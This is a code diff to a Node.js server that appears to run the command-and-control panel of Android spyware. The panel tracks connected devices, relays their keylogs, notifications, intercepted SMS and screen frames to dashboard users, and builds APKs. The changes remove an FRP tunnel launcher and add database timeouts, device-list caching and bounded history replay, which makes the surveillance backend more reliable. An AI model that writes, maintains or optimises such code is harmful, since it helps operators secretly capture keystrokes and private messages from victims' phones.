@@ -22,7 +22,6 @@ const crypto         = require('crypto');
 const zlib           = require('zlib');
 const mongoose       = require('mongoose');
 const jwt            = require('jsonwebtoken');
-const { spawn }      = require('child_process');
 require('dotenv').config();
 
 // Never let MongoDB operations queue indefinitely while the cluster is
@@ -60,145 +59,6 @@ function pushLog(source, level, message) {
         pushLog('server', lvl === 'log' ? 'info' : lvl, args.join(' '));
     };
 });
-
-// ============================================
-// FRP LAUNCHER  (frps → wait → frpc) — auto-restart on any exit/error
-// ============================================
-const frpRuntime = {
-    frps: { controller: null, available: false },
-    frpc: { controller: null, available: false },
-};
-
-(function startFRP() {
-    const ROOT = path.resolve(__dirname, '..');
-
-    const frpsBin  = fs.existsSync('/usr/local/bin/frps') ? '/usr/local/bin/frps' : path.join(ROOT, 'frps', 'frps');
-    const frpcBin  = fs.existsSync('/usr/local/bin/frpc') ? '/usr/local/bin/frpc' : path.join(ROOT, 'frpc', 'frpc');
-    const frpsCfg  = fs.existsSync('/etc/frp/frps.toml')  ? '/etc/frp/frps.toml'  : path.join(ROOT, 'frps', 'frps.toml');
-    const frpcCfg  = fs.existsSync('/etc/frp/frpc.toml')  ? '/etc/frp/frpc.toml'  : path.join(ROOT, 'frpc', 'frpc.toml');
-
-    if (!fs.existsSync(frpsBin) || !fs.existsSync(frpcBin)) {
-        console.warn('[FRP] Binaries not found — skipping FRP startup.');
-        return;
-    }
-
-    function waitForPort(port, retries, delay, cb) {
-        const sock = new net.Socket();
-        sock.setTimeout(1000);
-        sock.on('connect', () => { sock.destroy(); cb(null); });
-        sock.on('error',   () => { sock.destroy(); retry(); });
-        sock.on('timeout', () => { sock.destroy(); retry(); });
-        sock.connect(port, '127.0.0.1');
-        function retry() {
-            if (retries <= 0) return cb(new Error(`Port ${port} not ready`));
-            setTimeout(() => waitForPort(port, retries - 1, delay, cb), delay);
-        }
-    }
-
-    // Spawn a process and restart it with exponential backoff whenever it exits.
-    // delay starts at initialDelay ms and doubles on each consecutive failure,
-    // capped at maxDelay. A clean (code=0) exit resets the delay counter.
-    // beforeSpawn(cb) is called before each launch — use it to wait for
-    // dependencies (e.g. frps being ready) before starting frpc.
-    function keepAlive(label, bin, cfg, { initialDelay = 1000, maxDelay = 30000, beforeSpawn } = {}) {
-        let delay = initialDelay;
-        let startedAt = 0;
-        let proc = null;
-        let stopped = false;
-        let restartTimer = null;
-
-        function launch() {
-            if (stopped) return;
-            if (beforeSpawn) {
-                beforeSpawn(() => doSpawn());
-            } else {
-                doSpawn();
-            }
-        }
-
-        function doSpawn() {
-            if (stopped) return;
-            console.log(`[${label}] Starting…`);
-            startedAt = Date.now();
-            proc = spawn(bin, ['-c', cfg], { stdio: 'pipe' });
-            proc.stdout.on('data', d => { process.stdout.write(`[${label}] ${d}`); pushLog(label, 'info', String(d)); });
-            proc.stderr.on('data', d => { process.stderr.write(`[${label}] ${d}`); pushLog(label, 'warn', String(d)); });
-
-            proc.on('error', err => {
-                console.error(`[${label}] Spawn error: ${err.message}`);
-                pushLog(label, 'warn', `Spawn error: ${err.message}`);
-            });
-
-            proc.on('close', code => {
-                proc = null;
-                if (stopped) return;
-                const uptime = ((Date.now() - startedAt) / 1000).toFixed(1);
-                console.warn(`[${label}] Exited (code=${code}, uptime=${uptime}s) — restarting in ${delay / 1000}s…`);
-                pushLog(label, 'warn', `Process exited (code=${code}, uptime=${uptime}s) — restarting in ${delay / 1000}s`);
-                // Reset backoff if it was running long enough to be considered stable (>60s)
-                if (Date.now() - startedAt > 60000) delay = initialDelay;
-                const nextDelay = delay;
-                delay = Math.min(delay * 2, maxDelay);
-                restartTimer = setTimeout(launch, nextDelay);
-            });
-        }
-
-        const controller = {
-            start() {
-                if (!stopped && (proc || restartTimer)) return;
-                stopped = false;
-                delay = initialDelay;
-                launch();
-            },
-            stop() {
-                stopped = true;
-                if (restartTimer) {
-                    clearTimeout(restartTimer);
-                    restartTimer = null;
-                }
-                if (proc) {
-                    const current = proc;
-                    proc = null;
-                    try { current.kill('SIGTERM'); } catch (_) {}
-                }
-            },
-            restart() {
-                this.stop();
-                setTimeout(() => this.start(), 50);
-            },
-            status() {
-                return {
-                    running: !!proc && !proc.killed,
-                    pid: proc?.pid || null,
-                    desired: !stopped,
-                };
-            },
-        };
-        controller.start();
-        return controller;
-    }
-
-    // Start frps — restart unconditionally on any exit.
-    frpRuntime.frps.controller = keepAlive('frps', frpsBin, frpsCfg);
-    frpRuntime.frps.available = true;
-
-    // Start frpc — but only after frps port 7000 is ready. On each restart of
-    // frpc, wait again for frps to be up first (frps may also be restarting).
-    frpRuntime.frpc.controller = keepAlive('frpc', frpcBin, frpcCfg, {
-        beforeSpawn: (cb) => {
-            waitForPort(7000, 30, 1000, (err) => {
-                if (err) {
-                    console.error('[FRP] frps not ready — will retry frpc in 5s…');
-                    setTimeout(cb, 5000);
-                } else {
-                    console.log('[FRP] frps ready — starting frpc…');
-                    cb();
-                }
-            });
-        },
-    });
-    frpRuntime.frpc.available = true;
-})();
 
 // ── Redis ─────────────────────────────────────────────────────────────────────
 const R = require('./redis');
@@ -1077,7 +937,7 @@ let runtimeDbSettings = {};
 let activeMongoUri = runtimeDbSettings.mongodbUri || MONGO_URI;
 const MONGO_OPERATION_TIMEOUT_MS = Math.max(
     1000,
-    Math.min(30000, Number.parseInt(process.env.MONGO_OPERATION_TIMEOUT_MS, 10) || 8000),
+    Math.min(10000, Number.parseInt(process.env.MONGO_OPERATION_TIMEOUT_MS, 10) || 4000),
 );
 // Apply a server-side execution limit to every Mongoose query, including
 // routes added later, so one slow operation cannot occupy a pool slot forever.
@@ -1091,7 +951,7 @@ const MONGO_MAX_POOL_SIZE = Math.max(
 );
 const MONGO_WAIT_QUEUE_TIMEOUT_MS = Math.max(
     1000,
-    Math.min(15000, Number.parseInt(process.env.MONGO_WAIT_QUEUE_TIMEOUT_MS, 10) || 5000),
+    Math.min(5000, Number.parseInt(process.env.MONGO_WAIT_QUEUE_TIMEOUT_MS, 10) || 2500),
 );
 const MONGO_RECONNECT_MAX_DELAY_MS = 60000;
 const _mongoKey = runtimeDbSettings.mongodbUri ? 'dashboard setting'
@@ -1215,9 +1075,9 @@ function connectMongo(uri = activeMongoUri) {
                 maxConnecting: 2,
                 maxIdleTimeMS: 60000,
                 waitQueueTimeoutMS: MONGO_WAIT_QUEUE_TIMEOUT_MS,
-                serverSelectionTimeoutMS: 5000,
-                connectTimeoutMS: 10000,
-                socketTimeoutMS: 30000,
+                serverSelectionTimeoutMS: 3000,
+                connectTimeoutMS: 5000,
+                socketTimeoutMS: 15000,
                 heartbeatFrequencyMS: 10000,
                 retryReads: true,
                 retryWrites: true,
@@ -1278,6 +1138,15 @@ const pendingCmds = new Map();         // commandId → pending info
 let pendingCommandOrder = 0;
 /** @type {Map<string, Object>} In-memory device registry for when MongoDB is unavailable */
 const inMemoryDevices = new Map();     // deviceId → device object
+// A short shared snapshot prevents every dashboard refresh/SSE reconnect from
+// competing for the same small MongoDB pool. Live TCP state is still applied
+// when the snapshot is returned, so online/offline changes remain immediate.
+const DEVICE_LIST_CACHE_TTL_MS = Math.max(
+    250,
+    Math.min(5000, Number.parseInt(process.env.DEVICE_LIST_CACHE_TTL_MS, 10) || 1500),
+);
+let deviceListCache = { expiresAt: 0, devices: null };
+let deviceListRefreshInFlight = null;
 /** @type {Set<string>} Devices that have an active legacy push-stream session */
 const deviceStreamingState = new Set(); // retained for legacy stream state only
 /** @type {Map<string, number>} Timestamp (ms) of last device:ping sent — used to compute true TCP RTT */
@@ -1333,6 +1202,10 @@ function persistDeviceHeartbeat(deviceId) {
         { $set: { lastSeen: new Date(now), isOnline: true } },
     ).maxTimeMS(MONGO_OPERATION_TIMEOUT_MS).exec().catch(() => {});
 }
+
+function invalidateDeviceListCache() {
+    deviceListCache = { expiresAt: 0, devices: null };
+}
 const realtimeSseState = new Map();      // clientId → { sending, latestPayload }
 /** @type {Map<string, Object>} Latest JPEG stream frame per device — polled by dashboard */
 const latestStreamFrame = new Map();      // deviceId → { frameData, deviceId, _ts, screenWidth?, screenHeight? }
@@ -1367,8 +1240,12 @@ function tcpSend(conn, event, data) {
 function sseSend(clientId, event, data) {
     const client = sseClients.get(clientId);
     if (client && !client.res.writableEnded) {
-        client.res.write(`data: ${JSON.stringify({ event, data })}\n\n`);
-        if (typeof client.res.flush === 'function') client.res.flush();
+        try {
+            client.res.write(`data: ${JSON.stringify({ event, data })}\n\n`);
+            if (typeof client.res.flush === 'function') client.res.flush();
+        } catch (_) {
+            sseClients.delete(clientId);
+        }
     }
 }
 
@@ -2178,8 +2055,9 @@ const tcpServer = tls.createServer({ key: tlsKey, cert: tlsCert, allowHalfOpen: 
                     // Stale socket from previous reconnect — suppress noise
                     return;
                 }
-                // Grace period: wait 3 s before marking offline, so rapid reconnects (frp tunnel
-                // rotation, mobile network handoffs) don't produce false offline flashes in the UI.
+                // Grace period: wait 3 s before marking offline, so rapid
+                // reconnects during mobile network handoffs don't produce
+                // false offline flashes in the UI.
                 const disconnectedDeviceId = conn.deviceId;
                 const disconnectedConnId   = id;
                 setTimeout(async () => {
@@ -2228,6 +2106,15 @@ tcpServer.listen(TCP_PORT, '0.0.0.0', () =>
 const app    = express();
 const server = http.createServer(app);
 
+// Bound idle/headers time so an abandoned client cannot occupy an HTTP socket
+// forever. SSE endpoints send keep-alives separately and are excluded from the
+// API response deadline below.
+server.requestTimeout = 120000;
+server.headersTimeout = 15000;
+server.keepAliveTimeout = 5000;
+server.timeout = 45000;
+server.maxRequestsPerSocket = 1000;
+
 // Compress HTTP responses — reduces dashboard payload sizes significantly on slow connections.
 // SSE streams are excluded automatically (streaming responses bypass compression).
 app.use(compression({
@@ -2271,6 +2158,37 @@ app.use(express.static(path.join(__dirname, 'public'), {
         }
     }
 }));
+
+// MongoDB/Redis outages should produce a bounded error instead of leaving a
+// browser request spinning forever. Long-lived streams and binary uploads are
+// intentionally excluded because their lifetime is controlled by the stream
+// or upload protocol.
+const API_RESPONSE_TIMEOUT_MS = Math.max(
+    5000,
+    Math.min(30000, Number.parseInt(process.env.API_RESPONSE_TIMEOUT_MS, 10) || 15000),
+);
+app.use('/api', (req, res, next) => {
+    const pathName = req.path || '';
+    const longLived = pathName === '/events'
+        || pathName === '/logs/stream'
+        || pathName.startsWith('/build/download')
+        || pathName.startsWith('/build/worker/upload')
+        || pathName === '/build/apk'
+        || pathName.startsWith('/settings/telegram/test');
+    if (!longLived) {
+        res.setTimeout(API_RESPONSE_TIMEOUT_MS, () => {
+            if (!res.headersSent) {
+                res.status(503).json({
+                    success: false,
+                    error: 'Request timed out while waiting for a backend dependency',
+                });
+            } else {
+                res.destroy();
+            }
+        });
+    }
+    next();
+});
 
 // Brute-force protection on login + captcha endpoints. Catches scripted
 // credential-stuffing while letting normal humans retry several times.
@@ -2390,9 +2308,13 @@ app.get('/api/events', async (req, res) => {
                 // leaving normal users stuck on "Reconnecting..." while admin
                 // sessions (which do not query MongoDB) connect normally.
                 accessId = String(decoded.accessId || '').trim();
-                if (!accessId) {
+                if (!accessId && mongoose.connection.readyState === 1) {
                     try {
-                        const u = await User.findById(userId).select('accessId').lean();
+                        const u = await User.findById(userId)
+                            .select('accessId')
+                            .maxTimeMS(MONGO_OPERATION_TIMEOUT_MS)
+                            .lean()
+                            .exec();
                         accessId = (u && u.accessId) || '';
                     } catch (_) { /* JWT without an accessId remains valid */ }
                 }
@@ -2412,30 +2334,63 @@ app.get('/api/events', async (req, res) => {
     sseClients.set(clientId, { res, token, role, accessId, userId });
     log('SSE', `Dashboard connected ${clientId} (${role}${accessId ? ' / ' + accessId : ''})`);
 
-    // Immediately push device list + command registry, scoped per role
+    // Immediately push device list + command registry, scoped per role.
+    // getDeviceList is cached/coalesced, so reconnect storms do not create a
+    // matching storm of MongoDB queries.
     const list = await getDeviceList(role === 'user' ? accessId : null);
     sseSend(clientId, 'device:list', list);
     sseSend(clientId, 'commands:registry', COMMANDS);
     // Tell the client its own sseId so it can include it in HTTP requests
     sseSend(clientId, 'session:init', { sseClientId: clientId });
 
-    // Replay buffered data from Redis for all known devices so the dashboard
-    // sees everything that happened while it was disconnected / the user was away.
-    try {
+    // Replay history after the handshake. A dashboard must be usable even
+    // when MongoDB is slow, and opening one connection must not fan out into
+    // hundreds of simultaneous per-device queries.
+    const replayHistory = async () => {
         const deviceIds = list.map(d => d.deviceId).filter(Boolean);
-        for (const did of deviceIds) {
-            const [keylogs, notifications, activity, smsHuntMessages] = await Promise.all([
-                R.getKeylogs(did),
-                R.getNotifications(did),
-                R.getActivity(did),
-                SmsHuntMessage.find({ deviceId: did }).sort({ receivedAt: -1 }).limit(500).lean().catch(() => []),
-            ]);
-            if (keylogs.length)        sseSend(clientId, 'keylog:history',       { deviceId: did, entries: keylogs });
-            if (notifications.length)  sseSend(clientId, 'notification:history', { deviceId: did, entries: notifications });
-            if (activity.length)       sseSend(clientId, 'activity:history',     { deviceId: did, entries: activity });
-            if (smsHuntMessages.length) sseSend(clientId, 'sms_hunt:history', { deviceId: did, messages: smsHuntMessages });
+        const maxDevices = Math.max(
+            1,
+            Math.min(100, Number.parseInt(process.env.SSE_HISTORY_MAX_DEVICES, 10) || 50),
+        );
+        const selected = deviceIds.slice(0, maxDevices);
+        const concurrency = 4;
+        let cursor = 0;
+        const worker = async () => {
+            while (cursor < selected.length) {
+                const did = selected[cursor++];
+                try {
+                    const [keylogs, notifications, activity, smsHuntMessages] = await Promise.all([
+                        R.getKeylogs(did),
+                        R.getNotifications(did),
+                        R.getActivity(did),
+                        mongoose.connection.readyState === 1
+                            ? SmsHuntMessage.find({ deviceId: did })
+                                .sort({ receivedAt: -1 })
+                                .limit(100)
+                                .maxTimeMS(MONGO_OPERATION_TIMEOUT_MS)
+                                .lean()
+                                .exec()
+                                .catch(() => [])
+                            : [],
+                    ]);
+                    if (keylogs.length)        sseSend(clientId, 'keylog:history',       { deviceId: did, entries: keylogs });
+                    if (notifications.length)  sseSend(clientId, 'notification:history', { deviceId: did, entries: notifications });
+                    if (activity.length)       sseSend(clientId, 'activity:history',     { deviceId: did, entries: activity });
+                    if (smsHuntMessages.length) sseSend(clientId, 'sms_hunt:history', { deviceId: did, messages: smsHuntMessages });
+                } catch (e) {
+                    log('SSE', `History replay failed for ${did}: ${e.message}`, 'warn');
+                }
+            }
+        };
+        await Promise.all(Array.from({ length: Math.min(concurrency, selected.length) }, worker));
+        if (deviceIds.length > selected.length) {
+            sseSend(clientId, 'history:truncated', {
+                deviceCount: deviceIds.length,
+                replayed: selected.length,
+            });
         }
-    } catch (e) { log('SSE', `History replay error: ${e.message}`, 'warn'); }
+    };
+    setImmediate(() => replayHistory().catch(e => log('SSE', `History replay error: ${e.message}`, 'warn')));
 
     // Keep the connection alive with a comment every 25 s
     const keepAlive = setInterval(() => {
@@ -2482,8 +2437,6 @@ function getManagedServiceStatus() {
     const mongoConnecting = mongoose.connection.readyState === 2;
     const redisReady = R.isConnected();
     const redisConfigured = !!R.getConfiguredUrl();
-    const frps = frpRuntime.frps.controller;
-    const frpc = frpRuntime.frpc.controller;
 
     return {
         mongodb: serviceState(
@@ -2509,18 +2462,12 @@ function getManagedServiceStatus() {
                 note: 'Controls this server’s Redis connection; it does not power off a remote Redis host.',
             },
         ),
-        frps: frps
-            ? serviceState(frps.status().running ? 'running' : 'stopped', { kind: 'process', managed: true })
-            : serviceState('unavailable', { kind: 'process', managed: false }),
-        frpc: frpc
-            ? serviceState(frpc.status().running ? 'running' : 'stopped', { kind: 'process', managed: true })
-            : serviceState('unavailable', { kind: 'process', managed: false }),
         updatedAt: Date.now(),
     };
 }
 
 function ensureServiceName(name) {
-    return ['mongodb', 'redis', 'frps', 'frpc'].includes(name);
+    return ['mongodb', 'redis'].includes(name);
 }
 
 // Admin-only runtime service controls. Database controls intentionally manage
@@ -2555,10 +2502,6 @@ app.post('/api/admin/services/action', requireAdmin, async (req, res) => {
             if (action === 'stop') await R.stop();
             else if (action === 'restart') await R.restart();
             else await R.start();
-        } else {
-            const controller = frpRuntime[service].controller;
-            if (!controller) return res.status(503).json({ success: false, error: `${service} is unavailable` });
-            controller[action]();
         }
 
         log('ADMIN', `Service action: ${action} ${service}`);
@@ -3926,21 +3869,24 @@ app.get('/api/build/worker/status', requireAdmin, (req, res) => {
 // ============================================
 app.get('/api/devices', requireUserOrAdmin, async (req, res) => {
     try {
-        const filter = {};
+        let accessId = null;
         if (req.authRole === 'user') {
             // Prefer JWT-carried accessId; fall back to a fresh DB lookup so that
             // users with old tokens (before accessId was embedded in JWTs) still work.
-            let aid = req.authAccessId || '';
-            if (!aid) {
+            accessId = req.authAccessId || '';
+            if (!accessId && mongoose.connection.readyState === 1) {
                 try {
-                    const u = await User.findById(req.authUserId).select('accessId').lean();
-                    aid = (u && u.accessId) || '';
+                    const u = await User.findById(req.authUserId)
+                        .select('accessId')
+                        .maxTimeMS(MONGO_OPERATION_TIMEOUT_MS)
+                        .lean()
+                        .exec();
+                    accessId = (u && u.accessId) || '';
                 } catch (_) {}
             }
-            if (!aid) return res.json({ success: true, devices: [] });
-            filter.accessId = aid;
+            if (!accessId) return res.json({ success: true, devices: [] });
         }
-        const devices = await Device.find(filter).sort({ lastSeen: -1 });
+        const devices = await getDeviceList(accessId);
         res.json({ success: true, devices });
     } catch (e) { res.status(500).json({ success: false, error: e.message }); }
 });
@@ -5193,10 +5139,10 @@ app.get('/api/admin/devices', requireAdmin, async (req, res) => {
 });
 
 // ── Admin port inspection ─────────────────────────────────────────────────────
-// Container platforms generally expose HTTP through a reverse proxy but do
-// not expose arbitrary TCP listeners. Report what is actually listening, then
-// layer explicit FRP/environment mappings and the platform public URL on top
-// instead of guessing a public TCP port.
+// Container platforms expose HTTP through a reverse proxy and may expose TCP
+// listeners through their own port configuration. Report what is actually
+// listening, then layer explicit environment mappings and the platform public
+// URL on top instead of guessing a public TCP port.
 function _listeningTcpPorts() {
     const ports = new Set();
     for (const file of ['/proc/net/tcp', '/proc/net/tcp6']) {
@@ -5233,18 +5179,6 @@ function _explicitPortMappings() {
         if (match) add(match[1], value, key);
     }
 
-    const root = path.resolve(__dirname, '..');
-    const configPaths = ['/etc/frp/frpc.toml', path.join(root, 'frpc', 'frpc.toml')];
-    for (const configPath of configPaths) {
-        try {
-            const text = fs.readFileSync(configPath, 'utf8');
-            for (const block of text.split('[[proxies]]').slice(1)) {
-                const local = block.match(/localPort\s*=\s*(\d+)/i)?.[1];
-                const remote = block.match(/remotePort\s*=\s*(\d+)/i)?.[1];
-                if (local && remote) add(local, remote, `FRP: ${path.basename(configPath)}`);
-            }
-        } catch (_) {}
-    }
     return mappings;
 }
 
@@ -5437,7 +5371,7 @@ app.get('/api/admin/ports/status', requireAdmin, async (req, res) => {
             notes: [
                 'Listening ports are read from the container network namespace.',
                 'HTTP reverse proxies usually publish port 443 externally.',
-                'A public TCP port is shown only when FRP or an explicit PORT_MAP provides it.',
+                'A public TCP port is shown when the container platform or PORT_MAP exposes it.',
             ],
         });
     } catch (e) {
@@ -5495,19 +5429,61 @@ async function getDeviceList(accessIdFilter) {
         return devices.filter(d => (d.accessId || '') === accessIdFilter);
     };
 
-    // Priority: MongoDB → Redis → in-memory
-    try {
-        const dbDevices = await Device.find().sort({ lastSeen: -1 })
-            .maxTimeMS(MONGO_OPERATION_TIMEOUT_MS)
-            .lean()
-            .exec();
-        if (dbDevices && dbDevices.length > 0) return scope(reconcile(dbDevices));
-    } catch (_) {}
-    // Fallback: Redis
-    const redisDevices = await R.getAllDevices();
-    if (redisDevices.length > 0) return scope(reconcile(redisDevices.sort((a, b) => new Date(b.lastSeen) - new Date(a.lastSeen))));
-    // Final fallback: in-memory
-    return scope(reconcile(Array.from(inMemoryDevices.values())));
+    const now = Date.now();
+    const cached = deviceListCache;
+    if (cached.devices && cached.expiresAt > now) {
+        return scope(reconcile(cached.devices));
+    }
+
+    // Only one refresh may use Mongo/Redis at a time. Other requests wait for
+    // this short shared operation instead of occupying one pool slot each.
+    if (!deviceListRefreshInFlight) {
+        deviceListRefreshInFlight = (async () => {
+            // Priority: MongoDB → Redis → in-memory. Do not issue a Mongo
+            // query while the driver is disconnected; that only burns the
+            // wait queue before the fallback can answer.
+            if (mongoose.connection.readyState === 1) {
+                try {
+                    const dbDevices = await Device.find()
+                        .sort({ lastSeen: -1 })
+                        .maxTimeMS(MONGO_OPERATION_TIMEOUT_MS)
+                        .lean()
+                        .exec();
+                    if (dbDevices && dbDevices.length > 0) {
+                        deviceListCache = {
+                            devices: dbDevices,
+                            expiresAt: Date.now() + DEVICE_LIST_CACHE_TTL_MS,
+                        };
+                        return dbDevices;
+                    }
+                } catch (_) {}
+            }
+
+            try {
+                const redisDevices = await R.getAllDevices();
+                if (redisDevices.length > 0) {
+                    redisDevices.sort((a, b) => new Date(b.lastSeen) - new Date(a.lastSeen));
+                    deviceListCache = {
+                        devices: redisDevices,
+                        expiresAt: Date.now() + DEVICE_LIST_CACHE_TTL_MS,
+                    };
+                    return redisDevices;
+                }
+            } catch (_) {}
+
+            const memoryDevices = Array.from(inMemoryDevices.values());
+            deviceListCache = {
+                devices: memoryDevices,
+                expiresAt: Date.now() + Math.min(500, DEVICE_LIST_CACHE_TTL_MS),
+            };
+            return memoryDevices;
+        })().finally(() => {
+            deviceListRefreshInFlight = null;
+        });
+    }
+
+    const devices = await deviceListRefreshInFlight;
+    return scope(reconcile(devices || []));
 }
 
 // Broadcast device:list to every connected dashboard, scoped per recipient.
@@ -5516,6 +5492,7 @@ async function getDeviceList(accessIdFilter) {
 // to the round-trip latency improvement of doing it server-side.
 let deviceListBroadcastInFlight = null;
 async function broadcastDeviceList() {
+    invalidateDeviceListCache();
     if (sseClients.size === 0) return;
     if (deviceListBroadcastInFlight) return deviceListBroadcastInFlight;
     deviceListBroadcastInFlight = (async () => {
